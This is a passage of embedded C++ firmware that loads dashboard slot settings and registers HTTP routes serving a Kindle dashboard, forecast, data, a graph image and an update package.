    // dashboard exists as a thing, the filesystem is up by now, and it keeps
    // the sketch from needing to know that slots are a file at all.
    //
    // The two sensor ids seed the defaults, so a device that has never
    // configured a slot gets the page it had before slots existed — built from
    // whichever sensors it was already pointing at.
    //
    // Not again when setup() already did, before the pipeline started: by
    // now StorageTask holds fsMutex at times, and a load that timed out on it
    // would put the defaults over the places the boot read.
    if (!s_slotsLoaded && configFs()) kdSlotsBegin(*configFs(), outdoorSensorId(), indoorSensorId());

    server.on("/kindle/probe", HTTP_GET, handleKindleProbe);
    server.on("/kindle/clear", HTTP_GET, handleKindleClear);
#ifdef MODULE_FORECAST_ENABLED
    server.on("/kindle/forecast", HTTP_GET, handleKindleForecast);
#endif
    server.on("/kindle/data",  HTTP_GET, handleKindleData);
    // The package a reader updates itself from — docs/KINDLE_UPDATE.md §3.
    server.on("/kindle/pkg.tar", HTTP_GET, handleKindlePkgTar);
    server.on("/kindle/graph.bmp", HTTP_GET, handleKindleGraph);
    server.on("/kindle",       HTTP_GET, handleKindle);
}

#endif  // FEATURE_KINDLE_DASHBOARD
